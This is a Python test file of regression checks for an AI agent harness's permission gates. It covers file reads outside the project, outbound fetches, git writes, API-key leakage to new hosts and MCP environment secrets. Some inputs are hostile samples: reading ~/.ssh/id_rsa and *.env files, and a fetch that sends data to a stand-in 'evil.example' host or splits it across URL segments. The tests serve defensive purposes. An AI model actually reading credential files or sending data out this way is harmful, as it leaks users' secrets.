"""Regressions from the independent bug hunts: permissions, git, keys, MCP environment, imports, OpenCode, modes."""
import json
import os

import pytest

from meshpool_harness.agent.core import Agent
from meshpool_harness.core.tools import ToolError, Workspace


def asks(tmp_path, mode="ask"):
    seen = []
    a = Agent(str(tmp_path), mode=mode, approve=lambda kind, title, detail: seen.append((kind, title)) or ("no", ""))
    return a, seen


def test_reading_outside_the_project_asks_in_supervised(tmp_path):
    a, seen = asks(tmp_path)
    assert a._permit("read_file", {"path": "notes.txt"})[0] and not seen          # inside: no question
    ok, _ = a._permit("read_file", {"path": os.path.expanduser("~/.ssh/id_rsa")})
    assert not ok and seen and seen[-1][0] == "read" and "outside the project" in seen[-1][1]
    assert not a._permit("grep", {"pattern": "KEY", "path": "/etc"})[0]
    assert not a._permit("glob", {"pattern": "../../**/*.env"})[0]


def test_full_access_still_reads_anywhere(tmp_path):
    a, seen = asks(tmp_path, mode="auto")
    assert a._permit("read_file", {"path": "/etc/hostname"})[0] and not seen


def test_a_fetch_that_carries_data_out_asks(tmp_path):
    a, seen = asks(tmp_path)
    assert a._permit("fetch_url", {"url": "https://example.com/docs/page?q=python"})[0]
    assert not a._permit("fetch_url", {"url": "https://evil.example/c?d=" + "A" * 400})[0]
    assert seen and "carries" in seen[-1][1]


def test_agents_cannot_write_inside_git(tmp_path):
    (tmp_path / ".git").mkdir()
    ws = Workspace(str(tmp_path), str(tmp_path / "out"))
    with pytest.raises(ToolError):
        ws._path(".git/config", write=True)
    assert ws._path("src/app.py", write=True)


def test_saved_key_is_not_sent_to_a_new_host(tmp_path, monkeypatch):
    monkeypatch.setenv("MESHPOOL_HOME", str(tmp_path))
    (tmp_path / "meshpool.config").write_text("MESHPOOL_BASE_URL=https://llm.meshpool.ai/v1\nMESHPOOL_API_KEY=k-1\n")
    from meshpool_harness.ui import server as SV
    r = SV.test_connection({"MESHPOOL_BASE_URL": "https://other.example/v1"})
    assert not r["ok"] and "other.example" in r["detail"]
    with pytest.raises(ValueError):
        SV.save_settings({"values": {"MESHPOOL_BASE_URL": "https://other.example/v1"}})


def test_third_party_mcp_servers_get_no_keys(monkeypatch):
    from meshpool_harness.agent import mcp as M
    assert M._secret_name("MESHPOOL_API_KEY") and M._secret_name("SOME_SERVICE_TOKEN") and M._secret_name("DB_PASSWORD")
    assert not M._secret_name("PATH") and not M._secret_name("HOME")


def test_import_never_replaces_a_skill_it_did_not_make(tmp_path, monkeypatch):
    from meshpool_harness import importer as IM
    from meshpool_harness import skills as SK
    monkeypatch.setattr(SK, "folder", lambda: tmp_path)
    (tmp_path / "project-plan").mkdir()
    (tmp_path / "project-plan" / "SKILL.md").write_text("---\nname: project-plan\ndescription: mine\n---\nMy own steps\n")
    monkeypatch.setattr(SK, "create", lambda sid, desc, body, overwrite=False: (tmp_path / sid).mkdir(exist_ok=True)
                        or (tmp_path / sid / "SKILL.md").write_text(body))
    sid = IM._write_skill("project-Plan", "from Claude", "Imported steps")
    assert sid == "project-plan-2" and "My own steps" in (tmp_path / "project-plan" / "SKILL.md").read_text()
    assert IM._write_skill("project-Plan", "again", "Updated") == "project-plan-2"       # its own skill is updated


def test_opencode_asks_before_edits_commands_and_fetches(tmp_path, monkeypatch):
    monkeypatch.setenv("MESHPOOL_HOME", str(tmp_path))
    from meshpool_harness import harnesses as HR
    HR.prepare_opencode("deepseek-v4.1-flash")
    cfg = json.loads(next(tmp_path.rglob("opencode.json")).read_text())
    assert cfg["permission"] == {"edit": "ask", "bash": "ask", "webfetch": "ask"}


def test_unattended_reads_stay_in_the_project(tmp_path, monkeypatch):
    """Second test pass: run_subtasks sub-agents, read_document and ACP reads ran without asking and read any file;
    Supervised chats could read every other chat's history; addresses split across segments or subdomains carried
    data out unasked; a write that only looked unchanged went through without a prompt."""
    from meshpool_harness.agent.core import Agent
    from meshpool_harness.agent import office_mcp_server as O
    from meshpool_harness import config as C
    secret = tmp_path / "secret.txt"
    secret.write_text("KEY")
    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.setenv("MESHPOOL_PROJECT", str(proj))
    out, bad = O.read_document(str(secret))
    assert bad and "outside the project" in out
    a = Agent(str(proj))
    other = C.runs_dir() / "sessions" / "someone-else" / "session.json"
    assert a._outside("read_file", {"path": str(other)})                      # other chats ask
    assert not a._outside("read_file", {"path": str(proj / "x.txt")})
    assert a._outside("fetch_url", {"url": "https://ex.com/" + "/".join(["a" * 40] * 10)})
    assert a._outside("fetch_url", {"url": "https://" + ".".join(["b" * 30] * 4) + ".ex.com/"})
    assert not a._outside("fetch_url", {"url": "https://docs.python.org/3/library/pathlib.html#pathlib.Path"})
    f = proj / "crlf.txt"
    f.write_bytes(b"line1\r\nline2\r\n")
    assert not a._same_bytes("write_file", {"path": "crlf.txt", "content": "line1\nline2\n"})
    assert a._same_bytes("write_file", {"path": "crlf.txt", "content": "line1\r\nline2\r\n"})


def test_documents_survive_control_characters_long_names_and_other_scripts(tmp_path, monkeypatch):
    from meshpool_harness.agent import office_mcp_server as O
    monkeypatch.setenv("MESHPOOL_PROJECT", str(tmp_path))
    monkeypatch.setenv("MH_CLARITY", "0")
    out, bad = O.make_document("Page one\x0cPage two\x0b", "ff.docx")
    assert not bad, out
    out, bad = O.make_pdf("# Привет\n\n1. first\n2. second", "ع" * 200 + ".pdf")
    assert not bad, out
    made = list((tmp_path / "Meshpool outputs").glob("*.pdf"))
    assert made and len(made[0].name.encode()) <= 160
    reg, _ = O._pdf_font("Привет")
    assert reg != "Helvetica" or not any(__import__("pathlib").Path(p).exists() for p in
                                         ("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",))


def test_conversions_never_replace_a_file(tmp_path, monkeypatch):
    import pytest as _pt
    from meshpool_harness.agent import office_mcp_server as O
    if not O._soffice():
        _pt.skip("LibreOffice not installed")
    monkeypatch.setenv("MESHPOOL_PROJECT", str(tmp_path))
    monkeypatch.setenv("MH_CLARITY", "0")
    for d in ("a", "b"):
        (tmp_path / d).mkdir()
        O.make_document(f"Version {d}", f"../{d}/report.docx")
    docs = sorted((tmp_path / "Meshpool outputs").glob("report*.docx"))
    assert len(docs) == 2
    O.convert_document(str(docs[0]), "pdf")
    O.convert_document(str(docs[1]), "pdf")
    assert len(list((tmp_path / "Meshpool outputs").glob("report*.pdf"))) == 2


def test_office_jobs_get_their_own_folder_and_report_only_their_files(tmp_path):
    from meshpool_harness.agent import office_jobs as OJ
    a = OJ.new_job("sheets", "x", [], tmp_path)
    b = OJ.new_job("sheets", "y", [], tmp_path)
    assert OJ.JOBS[a]["out"] != OJ.JOBS[b]["out"]
    j = OJ.JOBS[a]
    (j["out"] / "Model.xlsx").write_bytes(b"x")
    (j["out"] / "sales.xlsx").write_bytes(b"x")
    j["inputs"] = {"sales.xlsx"}
    j["result"] = {"ok": True, "steps": [{"answer": "done", "artifacts": [str(j["out"] / "Model.xlsx")]}]}
    j["done"] = 1.0
    text, _ = OJ.report(a)
    assert "Model.xlsx" in text and "sales.xlsx" not in text


def test_sheet_checks_read_macro_workbooks():
    from engines.sheets import qa
    import inspect
    assert '.stem + ".xlsx"' in inspect.getsource(qa.recalc)
